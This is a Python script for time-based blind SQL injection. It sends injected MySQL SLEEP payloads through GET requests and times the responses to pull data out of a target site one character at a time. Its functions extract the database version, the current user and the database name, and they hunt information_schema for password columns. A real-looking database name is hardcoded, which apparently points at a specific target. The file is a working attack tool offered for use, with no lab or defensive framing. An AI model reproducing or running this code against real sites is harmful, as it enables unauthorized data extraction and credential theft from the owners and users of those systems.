#!/usr/bin/env python
import optparse
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
import sys
import time
from Cookie import SimpleCookie

def display_usage():
    print "(!) Usage:           %s -u <target_url> -s <seconds_to_sleep> -d <delay_between_requests> -p <proxy_url> -c <cookies>" % sys.argv[0]
    print "(-) Example:         %s \"-u https://owned.pwnd.com/id=\" -s 1 -d 1 -p http://127.0.0.1:8080 -c 'PHPSESSID=asdfasdfasdf'" % sys.argv[0]

def send_injected_query(char_type_range, iterator, injected_query):
    for charnum in char_type_range:
        injected_url = "%s%s" % (target_url, injected_query.replace("[CHAR]", str(charnum)))
        #print injected_url
        time.sleep(delay)                                                                         
        # Submit request
        try:
            r = requests.get(injected_url,proxies=proxy,cookies=cookies,verify=False,timeout=10)
        except:
            print "\033[%sC" % (iterator+1) + chr(charnum) + "\r",                                                                                                                                                 
            sys.stdout.flush()      
            continue     
        # If Content-Length indicates successful injection, return character                                                                                                                                                                                
        #content_length = int(r.headers['Content-Length'])
        # if content_length > x:
        # If text contained in response body indicates successful injection, return character                                                                                                                                                                                                                                                                                        
        # if true_response_text in r.text:         
        # If response time indicates successful injection, return character
        if r.elapsed.total_seconds() > seconds_to_sleep:                                                                                                                                                                         
            return charnum                                                                                                                                                                                         
        else:                                                                                                                                                                                                      
            print "\033[%sC" % (iterator+1) + chr(charnum) + "\r",                                                                                                                                                 
            sys.stdout.flush()                                                                                                                                                                                     
    return None

def inject_query(field_length, char_type, query):
    extracted_string = "  "
    # For the number of characters in the field_length, loop through every ASCII hex character                                                                                                                     
    for i in range(1, field_length):        
        injected_query = "1' AND (SELECT CASE WHEN (SELECT ASCII(SUBSTR((%s),%d,1))='[CHAR]') THEN SLEEP(%s) END));-- -" % (query, i, seconds_to_sleep)     
        try:                                                                                                                                                                                                   
            extracted_char = chr(send_injected_query(char_type, i, injected_query))                                                                                                                                                                                                                                                                                              
            extracted_string += extracted_char                                                                                                                                                                     
        except:                                                                                                                                                                                                 
            print extracted_string                                                                                                                                                                                 
            break                                                                                                                                                                                                  
        print extracted_string + "\r",                                                                                                                                                                             
        sys.stdout.flush()                                                                                                                                                                                     
    return extracted_string

def get_version():
    print "(-) Extracting database version:"
    inject_query(64, upper_lower_numeric_symbols, "SELECT version()")

def get_current_db():
    print "(-) Extracting current database name:"
    current_db_name = inject_query(16, lower, "SELECT database()")
    return current_db_name

def get_current_user():
    print "(-) Extracting current user name:"
    inject_query(16, lower, "SELECT user()")

def get_columns(db_name):
    column_names_tbnames = []
    print "(-) Extracting the number of columns matching 'PASSWORD' in the database:"
    column_count = int(inject_query(8, numeric, "SELECT COUNT(*) FROM information_schema.columns WHERE table_schema = '%s' AND column_name LIKE 'password'" % current_db_name))
    for i in range(0, column_count-1):
        print "(-) Extracting COLUMNNAME:"
        column_name = inject_query(32, upper_lower_numeric_symbols, "select concat('Column: ',(select column_name from information_schema.columns where table_schema = '%s' and column_name like 'password' limit 1 offset %d),', Table: ',(select table_name from information_schema.columns where table_schema = '%s' and column_name like 'password' limit 1 offset %d));" % (current_db_name, i, current_db_name, i))
        column_names_tbnames += column_name
    return column_names_tbnames

if __name__ == "__main__":
    # Input
    if len(sys.argv) < 4:
        display_usage()
        sys.exit(-1)
    
    parser = optparse.OptionParser()
    parser.add_option("-u", "--url", dest="target_url")
    parser.add_option("-p", "--proxy", dest="proxy")
    parser.add_option("-s", "--sleep", dest="seconds_to_sleep")
    parser.add_option("-d", "--delay", dest="delay")
    parser.add_option("-c", "--cookies", dest="cookies")
    
    options, args = parser.parse_args()

    target_url = options.target_url
    seconds_to_sleep = float(options.seconds_to_sleep)
    delay = float(options.delay)
    if options.cookies:
        raw_cookies = options.cookies
        simple_cookies = SimpleCookie()
        simple_cookies.load(raw_cookies)
        cookies = {}
        for key, morsel in simple_cookies.items():
            cookies[key] = morsel.value
    else:
        cookies = { "1337": "1337" }
    if options.proxy:
        proxy = { 
            "http": "%s" % options.proxy,
            "https": "%s" % options.proxy
            }
    else:
        proxy = { "http": "None" }

    # ASCII character ranges, ordered by probability
    upper_underscore = list(range(65,90))
    upper_underscore.append(95)
    upper_lower_numeric_symbols = list(range(32,126))
    upper_numeric_symbols = list(range(65,96)) + list(range(32,64)) + list(range(123,126))
    upper_lower_numeric = list(range(48,57)) + list(range(65,90)) + list(range(97,122))
    upper_lower = list(range(65,90)) + list(range(97,122))
    upper = range(65,90)
    lower = range(97,122)
    numeric = range(48,57)
    numeric_dot = range(48,57)
    numeric_dot.append(46)
    
    # Output
    print "(-) Target URL:                      %s" % target_url
    print "(-) Seconds to sleep when True:      %s" % seconds_to_sleep
    print "(-) Delay between requests:          %s" % delay
    print "(-) Injecting queries and sending to target"
    #get_version()
    #get_current_user()
    #current_db_name = get_current_db()
    current_db_name = "redcrossy"
    columns = get_columns(current_db_name)
    print "(+) Done!"